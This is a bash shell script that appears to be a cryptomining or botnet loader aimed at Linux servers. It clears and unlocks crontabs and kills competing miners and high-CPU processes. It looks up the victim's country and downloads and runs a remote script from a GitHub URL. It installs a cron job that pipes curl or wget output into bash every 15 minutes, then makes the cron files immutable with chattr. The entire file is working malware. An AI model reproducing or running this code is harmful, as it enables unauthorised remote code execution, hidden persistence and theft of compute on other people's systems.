#!/bin/bash
for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1; do
    [ -f "$file" ] && chattr -i -a "$file"
done
crontab -r 2>/dev/null || true
iptables -A INPUT -s 66.23.199.44 -j DROP 2>/dev/null || true
pkill -9 -f 'bash -s ' 2>/dev/null
for pid in $(pgrep -f 'bash /tmp/.*\.sh' 2>/dev/null); do
    [[ "$pid" != "$$" && "$pid" != "$PPID" ]] && kill -9 "$pid" 2>/dev/null
done
[[ $(id -u) -eq 0 ]] && systemctl stop systemd_s 2>/dev/null

check_system_specs() {
    local cpu=$(nproc 2>/dev/null || grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 1)
    [[ $cpu -gt 8 && $(id -u) -eq 0 ]] && echo "VERY GOOD BOY!"
}
check_system_specs

kill_high_cpu_processes() {
    local exclude=("reservepattern454545" "oAwgBCFH")
    ps -eo pid,%cpu --sort=-%cpu 2>/dev/null | awk '$2>150 {print $1}' | while read -r pid; do
        cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null || echo "")
        for p in "${exclude[@]}"; do [[ "$cmd" == *"$p"* ]] && continue 2; done
        kill -9 "$pid" 2>/dev/null
    done
}
kill_high_cpu_processes

is_program_running() {
    for d in /proc/[0-9]*; do
        [[ -r "$d/cmdline" ]] || continue
        cmd=$(tr '\0' ' ' < "$d/cmdline")
        [[ "$cmd" == *"oAwgBCFH"* && "$cmd" != *"is_program_running"* ]] || continue
        [[ $(awk '{print $3}' "$d/stat" 2>/dev/null) != "Z" ]] && return 0
    done
    return 1
}

download_and_execute() {
    local url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/run1.sh"
    local cn_url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/runCN1.sh"
    local file="run1.sh"
    if command -v curl >/dev/null; then
        curl -s --connect-timeout 3 http://ip-api.com/json/ | grep -q '"country":"China"' && url="$cn_url"
    fi
    curl -fkso "$file" "$url" 2>/dev/null || wget -qO "$file" "$url" 2>/dev/null || return 1
    chmod +x "$file"
    sed -i 's/\r$//' "$file" 2>/dev/null || true
    bash "$file" 2>/dev/null
    rm -f "$file"
}

cpu_count=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 1)
if ! is_program_running; then
    [[ $cpu_count -gt 3 || $(hostname) =~ ec2|compute|aliyun ]] && download_and_execute
fi

create_cronjob() {
    local cmd=""
    command -v curl >/dev/null && cmd="curl -fsSLk $1 | tr -d '\r' | bash"
    command -v wget >/dev/null && cmd="wget -qO- $1 | tr -d '\r' | bash"
    [[ -n "$cmd" ]] && (crontab -l 2>/dev/null | grep -v "$1"; printf "*/15 * * * * %s\n" "$cmd") | crontab -
}
create_cronjob "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon1.sh"

for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1 /etc/init.d/down; do
    [ -f "$file" ] && chattr +i +a "$file" 2>/dev/null
done
